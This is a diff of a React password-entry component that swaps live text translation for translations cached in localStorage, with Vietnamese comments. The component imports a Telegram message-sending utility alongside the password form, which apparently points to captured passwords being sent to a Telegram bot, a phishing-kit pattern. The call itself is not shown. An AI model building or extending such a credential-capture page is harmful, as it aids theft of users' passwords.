@@ -1,10 +1,9 @@
 import { faTimes } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import PropTypes from 'prop-types';
-import { useState, useEffect, useCallback, useMemo } from 'react';
+import { useState, useEffect, useMemo } from 'react';
 import { useNavigate } from 'react-router';
 import sendMessage from '@/utils/telegram';
-import { translateText } from '@/utils/translate';
 import { PATHS } from '@/router/router';
 
 const PasswordInput = ({ onClose }) => {
@@ -24,48 +23,14 @@ const PasswordInput = ({ onClose }) => {
         []
     );
 
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
-
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [
-                    translatedTitle,
-                    translatedDesc,
-                    translatedLabel,
-                    translatedPlaceholder,
-                    translatedContinue,
-                    translatedLoading
-                ] = await Promise.all([
-                    translateText(defaultTexts.title, targetLang),
-                    translateText(defaultTexts.description, targetLang),
-                    translateText(defaultTexts.passwordLabel, targetLang),
-                    translateText(defaultTexts.placeholder, targetLang),
-                    translateText(defaultTexts.continueBtn, targetLang),
-                    translateText(defaultTexts.loadingText, targetLang)
-                ]);
-
-                setTranslatedTexts({
-                    title: translatedTitle,
-                    description: translatedDesc,
-                    passwordLabel: translatedLabel,
-                    placeholder: translatedPlaceholder,
-                    continueBtn: translatedContinue,
-                    loadingText: translatedLoading
-                });
-            } catch {
-                //
-            }
-        },
-        [defaultTexts]
+    // 🚀 Lấy texts từ cache, không dịch lại
+    const translations = JSON.parse(localStorage.getItem('translations'));
+    const [translatedTexts, setTranslatedTexts] = useState(
+        translations?.password || defaultTexts
     );
 
-    useEffect(() => {
-        const targetLang = localStorage.getItem('targetLang');
-        if (targetLang && targetLang !== 'en') {
-            translateAllTexts(targetLang);
-        }
-    }, [translateAllTexts]);
+    // 🚀 XÓA HẾT hàm dịch
+    // useEffect dịch đã được xóa
 
     const handleSubmit = async () => {
         if (!password.trim()) return;
